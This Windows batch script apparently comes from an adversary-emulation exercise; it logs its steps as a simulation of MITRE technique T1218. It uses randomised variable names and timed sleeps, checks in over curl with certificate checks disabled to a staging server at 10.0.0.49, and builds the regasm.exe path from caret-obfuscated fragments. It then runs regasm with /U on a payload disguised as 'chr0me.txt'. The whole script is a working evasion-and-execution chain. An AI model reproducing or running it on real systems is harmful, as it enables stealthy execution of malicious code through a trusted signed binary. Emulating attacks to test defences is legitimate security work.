@echo off
SETLOCAL ENABLEDELAYEDEXPANSION
REM Random constant names with PHR_ as values
SET txisnba=%APPDATA%\9296\42c97e62
SET mdvfmsbx=https://10.0.0.49
SET keghkgto=https://10.0.0.49/stage/2/icon.png?9296-10
SET jwcnifl=ITZEL-S2BO
SET rrocubc=10
SET xzanpex=chr0me.txt
SET dvhhyc=9296

SET logf=%APPDATA%\!rrocubc!\macula-simulations.log

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: script_init=start>> "!logf!" 2>nul
REM Initial delay
timeout /t 45 /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: delay_complete=45s>> "!logf!" 2>nul

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_start=>> "!logf!" 2>nul
curl -k -s -o nul "!keghkgto!"
SET htt=1
IF !ERRORLEVEL! NEQ 0 SET htt=0
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: heartbeat_result=!htt!>> "!logf!" 2>nul
ping -n 8 127.0.0.1 >nul

echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_start=!txisnba!>> "!logf!" 2>nul
cd /d "!txisnba!" 2>nul
SET chd=1
IF !ERRORLEVEL! NEQ 0 SET chd=0
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: chdir_result=!chd!>> "!logf!" 2>nul
SET /A dly=%RANDOM% %% 20 + 10
timeout /t !dly! /nobreak >nul

SET cm1=%SystemRoot%\Microsoft.NET\Framework\v4.0.30319\re
SET cm2=g^asm^.
SET cm3=e^x^e
SET cm4=/U
SET v1=!cm1!!cm2!!cm3!
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_exec_start=!v1!>> "!logf!" 2>nul
!v1! !cm4! "!xzanpex!" 2>nul
SET res=1
SET err=
IF !ERRORLEVEL! NEQ 0 SET res=0 & SET err=error_!ERRORLEVEL!
echo [!DATE! !TIME!][DEBUG][!jwcnifl!]: regasm_exec_result=!res!>> "!logf!" 2>nul
echo [%DATE:~10,4%-%DATE:~4,2%-%DATE:~7,2% %TIME%][!jwcnifl!]: !rrocubc!-!dvhhyc!-T1218|Signed Binary Proxy Execution=!res!:!err!>> "!logf!" 2>nul
CHOICE /C Y /N /D Y /T 12 >nul